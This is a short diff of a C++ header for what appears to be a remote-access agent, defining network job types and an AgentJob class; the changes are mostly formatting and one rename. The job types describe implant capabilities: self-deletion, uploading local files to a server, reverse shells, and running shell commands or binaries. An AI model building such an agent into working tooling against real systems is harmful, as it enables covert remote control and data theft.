@@ -16,13 +16,13 @@
 
 
 // define our agent job types
-#define AGENT_DIE 0             // Agent terminates and deletes itself. No extra data
-#define AGENT_SLEEP 1           // Agent terminates and sleep for a set time. Data is num seconds stored as raw long
-#define AGENT_DOWNLOAD_FILE 2   // Agent downloads file from server. Data is described in `net_file` structure
-#define AGENT_UPLOAD_FILE 3     // Agent uploads file to server from local fs. Data is string of path to file
-#define AGENT_REVERSE_SHELL 4   // Agent initiates a reverse shell. Data and process is still TBD
-#define AGENT_EXECUTE_SHELL 5   // Agent executes a shell command. Data is string of command to execute
-#define AGENT_EXECUTE_BINARY 6  // Agent executes a provided binary. Data is described in `net_file` structure
+#define AGENT_DIE 0                     // Agent terminates and deletes itself. No extra data
+#define AGENT_SLEEP 1                   // Agent terminates and sleep for a set time. Data is num seconds stored as raw long
+#define AGENT_DOWNLOAD_FILE 2           // Agent downloads file from server. Data is described in `net_file` structure
+#define AGENT_UPLOAD_FILE 3             // Agent uploads file to server from local fs. Data is string of path to file
+#define AGENT_REVERSE_SHELL 4           // Agent initiates a reverse shell. Data and process is still TBD
+#define AGENT_EXECUTE_SHELLSCRIPT 5     // Agent executes a shell command. Data is string of command to execute
+#define AGENT_EXECUTE_BINARY 6          // Agent executes a provided binary. Data is described in `net_file` structure
 
 
 // define our agent job data structure for sending over the network
@@ -33,12 +33,12 @@ private:
     unsigned long len;   // the length of the raw data 
     void *data; // the actual raw data 
 public: 
-    AgentJob(unsigned char type, unsigned long len, void* data);
-    AgentJob(unsigned long combined, void* data);
+    AgentJob(unsigned char type, unsigned long len, void *data);
+    AgentJob(unsigned long combined, void *data);
     ~AgentJob();
     unsigned char get_type();
     unsigned long get_len();
-    void* get_data();
+    void *get_data();
     void set_data(void *data);
     unsigned long encode_header();
 };
